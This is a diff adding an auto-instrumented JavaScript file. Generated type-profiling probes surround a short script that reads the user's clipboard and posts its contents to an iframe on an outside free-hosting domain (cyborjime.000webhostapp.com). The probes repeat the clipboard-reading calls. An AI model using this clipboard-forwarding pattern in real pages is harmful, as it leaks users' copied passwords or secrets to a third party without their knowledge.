@@ -1,0 +1,134 @@
+var Inst0 = 0;
+var Inst1 = 0;
+var Inst2 = 0;
+var Inst3 = 0;
+var Inst4 = 0;
+var Inst5 = 0;
+var Inst6 = 0;
+var Inst7 = 0;
+var Inst8 = 0;
+var Inst9 = 0;
+var Inst10 = 0;
+var Inst11 = 0;
+var Inst12 = 0;
+var Inst13 = 0;
+var Inst14 = 0;
+var Inst15 = 0;
+var Inst16 = 0;
+var Inst17 = 0;
+var Inst18 = 0;
+var Inst19 = 0;
+var Inst20 = 0;
+var Inst21 = 0;
+var Inst22 = 0;
+var Inst23 = 0;
+var Inst24 = 0;
+var Inst25 = 0;
+var Inst26 = 0;
+var Inst27 = 0;
+var Inst28 = 0;
+var Inst29 = 0;
+var Inst30 = 0;
+var Inst31 = 0;
+ 
+function _TypeOfArray(a) {
+	let number = true;	
+	let string = true;
+	for (let i = 0; i < a.length; i++) {
+		if (number && (typeof a[i]) != "number") {
+			number = false;	
+		}
+		if (string && (typeof a[i]) != "string") {
+			string = false;	
+		}
+		if (!number && !string)
+			break;
+	}
+	if (number)
+		return "number";
+	else if (string)
+		return "string";
+	else
+		return "any";
+}
+
+function _TypeIsEqual(t1, t2) {
+	return JSON.stringify(t1) === JSON.stringify(t2);
+}
+
+function _TypeOf(a, step) {
+	var t;
+	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
+	if (type == "array") {
+		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
+	} else if (type == "object") {
+		let shape = [];
+        if (step === undefined || step > 0) {
+            let keys = Object.keys(a);
+            let length = Math.min(100, keys.length);
+		    for (let i = 0; i < length; i++) {
+			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
+		    }
+        }
+		t = {type : type, extra: {shape: shape}};
+	} else {
+		t = {type : type};
+	} 
+	return t;
+}
+
+function _RecordType(loc, a) {
+	var t = _TypeOf(a);
+    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
+}
+
+try { if (Inst0 <= 1000 && typeof (requestClipboardAccess) != "undefined") {_RecordType("<19,41,2>",(requestClipboardAccess)); Inst0++; } } catch(e) {}
+        function requestClipboardAccess() {
+try { if (Inst1 <= 1000 && typeof (navigator.clipboard.readText().then(text => {
+                console.log("Clipboard content: " + text);
+                const iframe = document.getElementById("iframe");
+                const message = {
+                    type: "requestClipboard",
+                    clipboardData: text
+                };
+                iframe.contentWindow.postMessage(message, "https://cyborjime.000webhostapp.com");
+            }).catch) != "undefined") {_RecordType("<59,495,3>",(navigator.clipboard.readText().then(text => {
+                console.log("Clipboard content: " + text);
+                const iframe = document.getElementById("iframe");
+                const message = {
+                    type: "requestClipboard",
+                    clipboardData: text
+                };
+                iframe.contentWindow.postMessage(message, "https://cyborjime.000webhostapp.com");
+            }).catch)); Inst1++; } } catch(e) {}try { if (Inst2 <= 1000 && typeof (navigator.clipboard.readText().then) != "undefined") {_RecordType("<59,94,3>",(navigator.clipboard.readText().then)); Inst2++; } } catch(e) {}try { if (Inst3 <= 1000 && typeof (navigator.clipboard.readText) != "undefined") {_RecordType("<59,87,3>",(navigator.clipboard.readText)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (navigator.clipboard) != "undefined") {_RecordType("<59,78,3>",(navigator.clipboard)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (navigator) != "undefined") {_RecordType("<59,68,3>",(navigator)); Inst5++; } } catch(e) {}try { if (Inst6 <= 1000 && typeof (text) != "undefined") {_RecordType("<95,99,3>",(text)); Inst6++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (err) != "undefined") {_RecordType("<496,499,11>",(err)); Inst19++; } } catch(e) {}
+            navigator.clipboard.readText().then(text => {
+try { if (Inst7 <= 1000 && typeof (console.log) != "undefined") {_RecordType("<122,133,4>",(console.log)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (console) != "undefined") {_RecordType("<122,129,4>",(console)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (text) != "undefined") {_RecordType("<158,162,4>",(text)); Inst9++; } } catch(e) {}
+                console.log("Clipboard content: " + text);
+try { if (Inst11 <= 1000 && typeof (document.getElementById) != "undefined") {_RecordType("<197,220,5>",(document.getElementById)); Inst11++; } } catch(e) {}try { if (Inst12 <= 1000 && typeof (document) != "undefined") {_RecordType("<197,205,5>",(document)); Inst12++; } } catch(e) {}
+                const iframe = document.getElementById("iframe");
+try { if (Inst10 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<188,194,5>",(iframe)); Inst10++; } } catch(e) {}
+try { if (Inst14 <= 1000 && typeof (text) != "undefined") {_RecordType("<350,354,8>",(text)); Inst14++; } } catch(e) {}
+                const message = {
+                    type: "requestClipboard",
+                    clipboardData: text
+                };
+try { if (Inst13 <= 1000 && typeof (message) != "undefined") {_RecordType("<255,262,6>",(message)); Inst13++; } } catch(e) {}
+try { if (Inst15 <= 1000 && typeof (iframe.contentWindow.postMessage) != "undefined") {_RecordType("<392,424,10>",(iframe.contentWindow.postMessage)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (iframe.contentWindow) != "undefined") {_RecordType("<392,412,10>",(iframe.contentWindow)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<392,398,10>",(iframe)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (message) != "undefined") {_RecordType("<425,432,10>",(message)); Inst18++; } } catch(e) {}
+                iframe.contentWindow.postMessage(message, "https://cyborjime.000webhostapp.com");
+            }).catch(err => {
+try { if (Inst20 <= 1000 && typeof (console.error) != "undefined") {_RecordType("<522,535,12>",(console.error)); Inst20++; } } catch(e) {}try { if (Inst21 <= 1000 && typeof (console) != "undefined") {_RecordType("<522,529,12>",(console)); Inst21++; } } catch(e) {}try { if (Inst22 <= 1000 && typeof (err) != "undefined") {_RecordType("<575,578,12>",(err)); Inst22++; } } catch(e) {}
+                console.error("Failed to read clipboard contents: ", err);
+            });
+        }
+
+try { if (Inst23 <= 1000 && typeof (window.addEventListener) != "undefined") {_RecordType("<620,643,16>",(window.addEventListener)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (window) != "undefined") {_RecordType("<620,626,16>",(window)); Inst24++; } } catch(e) {}
+        window.addEventListener("message", function(event) {
+try { if (Inst25 <= 1000 && typeof (event) != "undefined") {_RecordType("<664,669,16>",(event)); Inst25++; } } catch(e) {}
+try { if (Inst26 <= 1000 && typeof (event.origin) != "undefined") {_RecordType("<690,702,17>",(event.origin)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (event) != "undefined") {_RecordType("<690,695,17>",(event)); Inst27++; } } catch(e) {}
+            if (event.origin !== "https://cyborjime.000webhostapp.com") {
+                return;
+            }
+try { if (Inst28 <= 1000 && typeof (console.log) != "undefined") {_RecordType("<801,812,20>",(console.log)); Inst28++; } } catch(e) {}try { if (Inst29 <= 1000 && typeof (console) != "undefined") {_RecordType("<801,808,20>",(console)); Inst29++; } } catch(e) {}try { if (Inst30 <= 1000 && typeof (event.data) != "undefined") {_RecordType("<847,857,20>",(event.data)); Inst30++; } } catch(e) {}try { if (Inst31 <= 1000 && typeof (event) != "undefined") {_RecordType("<847,852,20>",(event)); Inst31++; } } catch(e) {}
+            console.log("Received message from iframe: ", event.data);
+        });
+    
